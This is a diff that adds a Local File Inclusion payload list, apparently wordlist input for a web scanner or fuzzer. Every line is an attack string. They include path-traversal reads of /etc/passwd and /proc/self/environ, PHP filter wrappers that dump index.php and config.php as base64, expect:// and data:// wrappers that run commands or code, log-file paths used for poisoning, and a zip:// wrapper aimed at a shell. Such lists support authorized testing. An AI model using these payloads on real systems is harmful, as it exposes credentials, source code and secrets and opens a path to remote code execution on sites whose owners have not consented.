@@ -1,0 +1,22 @@
+# Local File Inclusion payloads — read files / source via PHP wrappers.
+# One payload per line. # comments ignored. Add your own freely.
+/etc/passwd
+../../../../../../etc/passwd
+../../../../../../etc/passwd%00
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=index
+php://filter/read=convert.base64-encode/resource=config.php
+php://filter/convert.base64-encode/resource=../../../../etc/passwd
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/status
+../../../../../../proc/self/environ
+expect://id
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
+/var/log/apache2/access.log
+/var/log/apache/access.log
+/var/log/nginx/access.log
+../../../../../../var/www/html/index.php
+....//....//....//etc//passwd
+php://input
+zip://shell.jpg%23payload.php
